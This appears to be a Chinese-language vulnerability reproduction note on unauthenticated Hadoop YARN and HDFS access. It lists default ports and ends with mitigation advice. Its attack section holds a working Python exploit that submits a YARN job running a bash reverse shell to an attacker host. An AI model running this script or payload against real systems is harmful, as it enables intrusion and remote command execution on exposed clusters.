<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs2D2816FE{}
			.csC48167EA{padding:0pt 5.4pt 0pt 5.4pt;border-top:none;border-right:none;border-bottom:1pt windowtext solid;border-left:none}
			.csE0FE76B{text-align:left;text-indent:0pt;margin:2pt 0pt 2pt 0pt}
			.csE35A2CA7{padding:0pt 5.4pt 0pt 5.4pt;border-top:none;border-right:none;border-bottom:none;border-left:none}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="hadoop未授权访问"><span class="csDE05BCC">Hadoop</span><span class="csECDA2D3">未授权访问</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">Hadoop</span><span class="cs9C1B1871">是一款由</span><span class="cs8926E06">Apache</span><span class="cs9C1B1871">基金会推出的分布式系统框架，它通过著名的</span><span class="cs8926E06"> MapReduce </span><span class="cs9C1B1871">算法进行分布式处理。这个框架被</span><span class="cs8926E06">Adobe</span><span class="cs9C1B1871">，</span><span class="cs8926E06">Last fm</span><span class="cs9C1B1871">，</span><span class="cs8926E06">EBay</span><span class="cs9C1B1871">，</span><span class="cs8926E06">Yahoo</span><span class="cs9C1B1871">等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在</span><span class="cs8926E06">hadoop</span><span class="cs9C1B1871">中实现分布式处理：</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">用户创建一个处理键值的</span><span class="cs8926E06">map</span><span class="cs9C1B1871">函数</span></li><li class="cs24C36B3"><span class="cs9C1B1871">产生了一套中间键</span><span class="cs8926E06">/</span><span class="cs9C1B1871">值</span></li><li class="cs24C36B3"><span class="cs8926E06">reduce</span><span class="cs9C1B1871">函数合并中间值并把他们关联到对应的键</span></li></ul>
		<h2 class="cs868C439D">
			<a name="二、影响范围"><span class="cs83F14626">二、影响范围</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h4 class="cs868C439D">
			<a name="X30d5b4d95da47801f709192b2554df07e6a3430"><span class="csBF12A472">1. </span><span class="cs6EDCDAE2">扫描探测</span></a></h4>
		<h5 class="cs868C439D">
			<a name="X679b56354a2900cc0323eba3d29219d4f8038e7"><span class="cs4B51D5E4">1.1 </span><span class="cs1C2E50E7">常见端口</span></a></h5>
		<p class="cs40DD2BC9"><span><img src="Web安全/Hadoop/Hadoop%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae_files/image0.png" width="560" height="788" alt="" style="border-width:0px;" /></span></p><h5 class="cs868C439D">
			<a name="X0dd79d565c4659e98ca47787cc5421f3ac6099b"><span class="cs4B51D5E4">1.2 </span><span class="cs1C2E50E7">敏感端口</span></a></h5>
		<table class="cs2D2816FE" border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;">
			<tr>
				<td class="csC48167EA" valign="bottom"><p class="csE0FE76B"><span class="cs9C1B1871">模块</span></p></td><td class="csC48167EA" valign="bottom"><p class="csE0FE76B"><span class="cs9C1B1871">节点</span></p></td><td class="csC48167EA" valign="bottom"><p class="csE0FE76B"><span class="cs9C1B1871">默认端口</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">HDFS</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">NameNode</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">50070</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">HDFS</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">SecondNameNode</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">50090</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">HDFS</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">DataNode</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">50075</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">HDFS</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">Backup/Checkpoint node</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">50105</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">MapReduce</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">JobTracker</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">50030</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">MapReduce</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">TaskTracker</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs8926E06">50060</span></p></td></tr>
		</table>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">通过访问</span><span class="cs8926E06"> NameNode WebUI </span><span class="cs9C1B1871">管理界面的</span><span class="cs8926E06"> 50070 </span><span class="cs9C1B1871">端口，可以下载任意文件。而且，如果</span><span class="cs8926E06"> DataNode </span><span class="cs9C1B1871">的默认端口</span><span class="cs8926E06"> 50075 </span><span class="cs9C1B1871">开放，攻击者可以通过</span><span class="cs8926E06"> HDSF </span><span class="cs9C1B1871">提供的</span><span class="cs8926E06"> restful API </span><span class="cs9C1B1871">对</span><span class="cs8926E06"> HDFS </span><span class="cs9C1B1871">存储的数据进行操作。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Hadoop/Hadoop%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae_files/image1.png" width="560" height="302" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="X8c8ad15eebe6a02374c53494678665c898179ec"><span class="csBF12A472">2. </span><span class="cs6EDCDAE2">攻击手法</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">利用方法和原理中有一些不同。在没有</span><span class="cs8926E06"> hadoop client </span><span class="cs9C1B1871">的情况下，直接通过</span><span class="cs8926E06"> REST API </span><span class="cs9C1B1871">也可以提交任务执行。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">利用过程如下：</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">在本地监听等待反弹</span><span class="cs8926E06"> shell </span><span class="cs9C1B1871">连接</span></li><li class="cs24C36B3"><span class="cs9C1B1871">调用</span><span class="cs8926E06"> New Application API </span><span class="cs9C1B1871">创建</span><span class="cs8926E06"> Application</span></li><li class="cs24C36B3"><span class="cs9C1B1871">调用</span><span class="cs8926E06"> Submit Application API </span><span class="cs9C1B1871">提交</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">P</span><span class="csE3F655E4">牛的攻击脚本</span></p><p class="cs3A447A38"><span class="cs9FB05234">##!/usr/bin/env python</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">target = &#39;http://127.0.0.1:8088/&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">lhost = &#39;192.168.0.1&#39; ## put your local host ip here, and listen at port 9999</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">url = target + &#39;ws/v1/cluster/apps/new-application&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">resp = requests.post(url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">app_id = resp.json()[&#39;application-id&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url = target + &#39;ws/v1/cluster/apps&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">data = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;application-id&#39;: app_id,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;application-name&#39;: &#39;get-shell&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;am-container-spec&#39;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;commands&#39;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;command&#39;: &#39;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#39; % lhost,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;application-type&#39;: &#39;YARN&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">requests.post(url, json=data)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Hadoop/Hadoop%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae_files/image2.png" width="560" height="253" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="X28497a420ab7857a6f7d54aae94a895f996832a"><span class="csBF12A472">3. </span><span class="cs6EDCDAE2">防范措施</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">网络访问控制</span><span class="cs8926E06"> </span><span class="cs9C1B1871">使用</span><span class="cs8926E06"> </span><span class="cs9C1B1871">安全组防火墙</span><span class="cs8926E06"> </span><span class="cs9C1B1871">或本地操作系统防火墙对访问源</span><span class="cs8926E06"> IP </span><span class="cs9C1B1871">进行控制。如果您的</span><span class="cs8926E06"> Hadoop </span><span class="cs9C1B1871">环境仅对内网服务器提供服务，建议不要将</span><span class="cs8926E06"> Hadoop </span><span class="cs9C1B1871">服务所有端口发布到互联网。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">启用认证功能</span><span class="cs8926E06"> </span><span class="cs9C1B1871">启用</span><span class="cs8926E06"> Kerberos </span><span class="cs9C1B1871">认证功能。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">更新补丁</span><span class="cs8926E06"> </span><span class="cs9C1B1871">不定期关注</span><span class="cs8926E06"> Hadoop </span><span class="cs9C1B1871">官方发布的最新版本，并及时更新补丁。</span></p></body>
</html>
